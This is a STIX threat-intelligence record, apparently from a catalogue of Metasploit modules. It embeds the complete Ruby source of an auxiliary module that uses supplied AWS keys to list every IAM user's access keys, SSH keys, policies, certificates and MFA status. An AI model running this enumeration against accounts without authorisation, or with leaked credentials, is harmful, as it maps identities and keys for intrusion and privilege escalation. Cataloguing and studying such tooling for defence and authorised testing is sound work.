{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5ec5b5a9-ca81-4926-88aa-fe1d4d2f681e",
    "created": "2024-08-14T16:21:44.524345Z",
    "modified": "2024-08-14T16:21:44.524348Z",
    "name": "Amazon Web Services IAM credential enumeration",
    "description": "( Provided AWS credentials, this module will call the authenticated API of Amazon Web Services to list all IAM credentials associated with the account )",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/cloud/aws/enum_iam.rb",
            "external_id": "enum_iam.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'aws-sdk-iam'\n\nclass MetasploitModule < Msf::Auxiliary\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name'        => 'Amazon Web Services IAM credential enumeration',\n        'Description' => %q(\n                          Provided AWS credentials, this module will call the authenticated\n                          API of Amazon Web Services to list all IAM credentials associated\n                          with the account\n                         ),\n        'Author'      => ['Aaron Soto <aaron.soto@rapid7.com>'],\n        'License'     => MSF_LICENSE\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('ACCESS_KEY_ID', [true, 'AWS Access Key ID (eg. \"AKIAXXXXXXXXXXXXXXXX\")', '']),\n        OptString.new('SECRET_ACCESS_KEY', [true, 'AWS Secret Access Key (eg. \"CA1+XXXXXXXXXXXXXXXXXXXXXX6aYDHHCBuLuV79\")', ''])\n      ]\n    )\n  end\n\n  def handle_aws_errors(e)\n    if e.class.module_parents.include?(Aws)\n      fail_with(Failure::UnexpectedReply, e.message)\n    else\n      raise e\n    end\n  end\n\n  def describe_iam_users(i)\n    user = i.user_name\n\n    print_good \"  User Name:       #{user}\"\n    print_good \"  User ID:         #{i.user_id}\"\n    print_good \"  Creation Date:   #{i.create_date}\"\n    print_good \"  Tags:            #{i.tags}\"\n    print_good \"  Groups:          #{i.group_list}\"\n    print_good \"  SSH Pub Keys:    #{@iam.list_ssh_public_keys(user_name: user).ssh_public_keys}\"\n\n    policies = i.attached_managed_policies\n    if policies.empty?\n      print_good \"  Policies:        []\"\n    else\n      print_good \"  Policies:        #{policies[0].policy_name}\"\n      policies[1..policies.length].each do |p|\n        print_good \"                   #{p.policy_name}\"\n      end\n    end\n\n    certs = @iam.list_signing_certificates(user_name: user).certificates\n    if certs.empty?\n      print_good \"  Signing certs:   []\"\n    else\n      print_good \"  Signing certs:   #{certs[0].certificate_id} (#{certs[0].status})\"\n      certs[1..certs.length].each do |c|\n        print_good \"                   #{c.certificate_id} (#{c.status})\"\n      end\n    end\n\n    @users.each do |u|\n      if u.user_name == user\n        print_good \"  Password Used:   #{u.password_last_used || '(Never)'}\"\n      end\n    end\n\n    keys = @iam.list_access_keys(user_name: user).access_key_metadata\n    if keys.empty?\n      print_good \"  AWS Access Keys: []\"\n    else\n      print_good \"  AWS Access Keys: #{keys[0].access_key_id} (#{keys[0].status})\"\n      keys[1..keys.length].each do |k|\n        print_good \"                   #{k.access_key_id} (#{k.status})\"\n      end\n    end\n\n    begin\n      console_login = @iam.get_login_profile(user_name: user).empty? ? 'Disabled' : 'Enabled'\n      print_good \"  Console login:   #{console_login}\"\n    rescue Aws::IAM::Errors::NoSuchEntity\n      print_good \"  Console login:   Disabled\"\n    end\n\n    mfa = @iam.list_mfa_devices(user_name: i.user_name).mfa_devices\n    mfa_enabled = mfa.empty? ? 'Disabled' : \"Enabled on #{mfa[0].enable_date}\"\n    print_good \"  Two-factor auth: #{mfa_enabled}\"\n\n    print_status ''\n  end\n\n  def run\n    @iam = Aws::IAM::Client.new(\n      region: 'us-west-1',      # This is meaningless, but required.  Thanks AWS.\n      access_key_id: datastore['ACCESS_KEY_ID'],\n      secret_access_key: datastore['SECRET_ACCESS_KEY']\n    )\n\n    @users = @iam.list_users.users\n    creds = @iam.get_account_authorization_details\n\n    users = creds.user_detail_list\n    if users.empty?\n      print_status 'No users found.'\n      return\n    end\n\n    print_good \"Found #{users.count} users.\"\n    users.each do |i|\n      describe_iam_users(i)\n    end\n  rescue ::Exception => e\n    handle_aws_errors(e)\n  end\nend\n"
}